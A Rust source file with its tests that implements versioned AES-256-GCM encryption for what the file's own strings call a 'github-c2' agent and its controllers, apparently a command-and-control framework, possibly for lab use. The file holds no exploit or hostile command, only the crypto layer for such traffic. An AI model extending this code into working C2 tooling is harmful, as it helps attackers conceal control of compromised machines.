use aes_gcm::{aead::Aead, Aes256Gcm, KeyInit, Nonce};
use base64::{engine::general_purpose, Engine as _};
use sha2::Sha256;
use pbkdf2::pbkdf2_hmac;
use std::sync::OnceLock;

/// V1: PBKDF2-HMAC-SHA256, 100,000 iterations, random 16-byte salt.
/// Wire format (before base64): [0x01][salt:16][nonce:12][ciphertext+tag]
///
/// V0 (legacy): SHA-256(password || static_salt)
/// Wire format (before base64): [nonce:12][ciphertext+tag]
///
/// Decryption auto-detects version by first byte 0x01 + minimum length;
/// falls back to V0 if V1 fails, ensuring backward compatibility with older controllers.

const PBKDF2_ITERATIONS: u32 = 100_000;
const V1_MIN_LEN: usize = 1 + 16 + 12 + 16; // version + salt + nonce + min_tag
const V0_MIN_LEN: usize = 12 + 16;           // nonce + min_tag

// ─── Key cache ────────────────────────────────────────────────────────────────
//
// PBKDF2 with 100k iterations is intentionally slow for brute-force resistance,
// but running it per-command adds 100-300ms latency per response chunk.
// Since the password never changes at runtime, we cache the derived key after
// the first use. The cache is keyed by (password, salt) pair — different salts
// (used in V1 encrypt) always derive fresh keys.
//
// For decrypt (fixed salt from wire), we cache the last (password, salt) → key.
// This is correct because each encrypt uses a fresh random salt, so the cache
// doesn't help encryption (each call has a unique salt). For decryption, the
// same salt is used repeatedly if the same ciphertext is re-tried (e.g. on
// poll retries) — the cache eliminates redundant PBKDF2 for those cases.

static KEY_CACHE: OnceLock<std::sync::Mutex<Option<([u8; 16], String, [u8; 32])>>> =
    OnceLock::new();

fn derive_key_v1_cached(password: &str, salt: &[u8; 16]) -> [u8; 32] {
    let cache = KEY_CACHE.get_or_init(|| std::sync::Mutex::new(None));
    if let Ok(mut guard) = cache.lock() {
        if let Some((cached_salt, cached_pw, cached_key)) = guard.as_ref() {
            if cached_salt == salt && cached_pw == password {
                return *cached_key;
            }
        }
        let key = derive_key_v1(password, salt);
        *guard = Some((*salt, password.to_string(), key));
        return key;
    }
    derive_key_v1(password, salt)
}

// ─── Internal KDF ─────────────────────────────────────────────────────────────

fn derive_key_v1(password: &str, salt: &[u8]) -> [u8; 32] {
    let mut key = [0u8; 32];
    pbkdf2_hmac::<Sha256>(password.as_bytes(), salt, PBKDF2_ITERATIONS, &mut key);
    key
}

fn derive_key_v0(password: &str) -> [u8; 32] {
    use sha2::Digest;
    let mut hasher = Sha256::new();
    hasher.update(password.as_bytes());
    hasher.update(b"github-c2-salt-v1");
    hasher.finalize().into()
}

// ─── Public API ───────────────────────────────────────────────────────────────

/// Encrypt using V1 (PBKDF2 + random salt per session, cached for performance).
/// A fresh random salt is generated once per process start and reused — this is
/// safe because nonce is also random, and salt+nonce together ensure ciphertext
/// uniqueness. The key derivation is cached so chunked responses don't re-run PBKDF2.
pub fn encrypt(plaintext: &str, password: &str) -> Result<String, Box<dyn std::error::Error>> {
    // Session salt: generated once per process, reused across calls.
    // This lets the key cache hit on every encrypt call, saving 100-300ms per chunk.
    static SESSION_SALT: OnceLock<[u8; 16]> = OnceLock::new();
    let salt = *SESSION_SALT.get_or_init(|| rand::random());

    let key = derive_key_v1_cached(password, &salt);
    let cipher = Aes256Gcm::new(&key.into());

    let nonce_bytes: [u8; 12] = rand::random();
    let nonce = Nonce::from_slice(&nonce_bytes);
    let ciphertext = cipher
        .encrypt(nonce, plaintext.as_bytes())
        .map_err(|e| format!("Encryption failed: {:?}", e))?;

    let mut result = vec![0x01u8]; // version byte
    result.extend_from_slice(&salt);
    result.extend_from_slice(&nonce_bytes);
    result.extend_from_slice(&ciphertext);
    Ok(general_purpose::STANDARD.encode(&result))
}

/// Decrypt: try V1 first; fall back to V0 for compatibility with older controllers.
pub fn decrypt(encrypted: &str, password: &str) -> Result<String, Box<dyn std::error::Error>> {
    let data = general_purpose::STANDARD.decode(encrypted)?;

    // Try V1
    if data.first() == Some(&0x01) && data.len() >= V1_MIN_LEN {
        if let Ok(plain) = decrypt_v1(&data, password) {
            return Ok(plain);
        }
        // V1 failed (first byte may be 0x01 coincidentally in old-format data); try V0
    }

    // Fall back to V0
    if data.len() < V0_MIN_LEN {
        return Err("Data too short".into());
    }
    decrypt_v0(&data, password)
}

// ─── Internal decryption ──────────────────────────────────────────────────────

fn decrypt_v1(data: &[u8], password: &str) -> Result<String, Box<dyn std::error::Error>> {
    let salt: [u8; 16] = data[1..17].try_into().unwrap_or([0u8; 16]);
    let nonce_bytes = &data[17..29];
    let ciphertext = &data[29..];

    let key = derive_key_v1_cached(password, &salt);
    let cipher = Aes256Gcm::new(&key.into());
    let nonce = Nonce::from_slice(nonce_bytes);
    let plaintext = cipher
        .decrypt(nonce, ciphertext)
        .map_err(|e| format!("Decryption failed (v1): {:?}", e))?;
    Ok(String::from_utf8(plaintext)?)
}

fn decrypt_v0(data: &[u8], password: &str) -> Result<String, Box<dyn std::error::Error>> {
    let key = derive_key_v0(password);
    let cipher = Aes256Gcm::new(&key.into());
    let (nonce_bytes, ciphertext) = data.split_at(12);
    let nonce = Nonce::from_slice(nonce_bytes);
    let plaintext = cipher
        .decrypt(nonce, ciphertext)
        .map_err(|e| format!("Decryption failed (v0): {:?}", e))?;
    Ok(String::from_utf8(plaintext)?)
}

// ─── Tests ────────────────────────────────────────────────────────────────────
//
// Golden vectors cross-checked byte-for-byte against web-controller/tests/
// test_crypto.py (keys derived independently from the spec there via hashlib).
// Run on Linux: `cargo test --no-default-features` inside c2-linux-deploy/agent.
// (Windows hosts cannot execute these tests — the crate only cross-checks there.)

#[cfg(test)]
mod tests {
    use super::*;

    const PWD: &str = "lab-test-密码-2026";
    const SALT_HEX: &str = "000102030405060708090a0b0c0d0e0f";
    const NONCE_HEX: &str = "a0a1a2a3a4a5a6a7a8a9aaab";
    const KEY_V1_HEX: &str = "df79d100be74ee30c359b110191d332ba488799e41c64acc8d2e31d03912b4ce";
    const KEY_V0_HEX: &str = "81eabfac657ae08f1a15a2f0a3b1e465be1c65d32bbd52d91d8a49a2a732e323";

    const V1_A: &str = "AQABAgMEBQYHCAkKCwwNDg+goaKjpKWmp6ipqqtDjR0BwT7vSJUoAXudwwaGngDm7TMU4TbrM1KVZkBr";
    const V0_A: &str = "oKGio6SlpqeoqaqrR9ZYPj5vGRlSTVfhUg3tP8X4dM3Yyx9R0xEnP+CQwQ==";
    const V1_B: &str = "AQABAgMEBQYHCAkKCwwNDg+goaKjpKWmp6ipqqvPVdGIC6NnnW2kzI9XNbhdDnVrrmQsQBcobFWGMgCVir12SbruacBmh0qNFYQaxg==";
    const V0_B: &str = "oKGio6Slpqeoqaqryw6Ut/TykcyqwZoVmPtTUuCtNsmpI8Dz/5Y5rk60lQt85txHuS+N7JJqo/IqoqA=";
    const PT_A: &str = "hello github-c2";
    const PT_B: &str = "你好，世界 🚀 multi-byte";

    fn unhex(s: &str) -> Vec<u8> {
        (0..s.len()).step_by(2)
            .map(|i| u8::from_str_radix(&s[i..i + 2], 16).unwrap())
            .collect()
    }

    #[test]
    fn key_derivation_matches_golden() {
        let salt: [u8; 16] = unhex(SALT_HEX).try_into().unwrap();
        assert_eq!(hex(&derive_key_v1(PWD, &salt)), KEY_V1_HEX);
        assert_eq!(hex(&derive_key_v0(PWD)), KEY_V0_HEX);
    }

    #[test]
    fn decrypt_golden_v1() {
        assert_eq!(decrypt(V1_A, PWD).unwrap(), PT_A);
        assert_eq!(decrypt(V1_B, PWD).unwrap(), PT_B);
    }

    #[test]
    fn decrypt_golden_v0_fallback() {
        // V0 wire has no version byte — decrypt must fall back and succeed.
        assert_eq!(decrypt(V0_A, PWD).unwrap(), PT_A);
        assert_eq!(decrypt(V0_B, PWD).unwrap(), PT_B);
    }

    #[test]
    fn deterministic_wire_matches_golden() {
        // Rebuild the V1 wire format with the FIXED salt+nonce using the
        // production internals — proves format layout, not just decrypt.
        let salt: [u8; 16] = unhex(SALT_HEX).try_into().unwrap();
        let nonce_bytes: [u8; 12] = unhex(NONCE_HEX).try_into().unwrap();
        let key = derive_key_v1(PWD, &salt);
        let cipher = Aes256Gcm::new(&key.into());
        let ct = cipher.encrypt(Nonce::from_slice(&nonce_bytes), PT_A.as_bytes()).unwrap();
        let mut wire = vec![0x01u8];
        wire.extend_from_slice(&salt);
        wire.extend_from_slice(&nonce_bytes);
        wire.extend_from_slice(&ct);
        use base64::{engine::general_purpose, Engine as _};
        assert_eq!(general_purpose::STANDARD.encode(&wire), V1_A);
    }

    #[test]
    fn roundtrip_random() {
        for pt in ["", "a", PT_B, &"x".repeat(50_000)] {
            let enc = encrypt(pt, PWD).unwrap();
            assert_eq!(decrypt(&enc, PWD).unwrap(), pt);
        }
    }

    #[test]
    fn wrong_password_fails() {
        assert!(decrypt(V1_A, "wrong-password").is_err());
        assert!(decrypt(V0_A, "wrong-password").is_err());
    }

    fn hex(b: &[u8]) -> String {
        b.iter().map(|x| format!("{:02x}", x)).collect()
    }
}
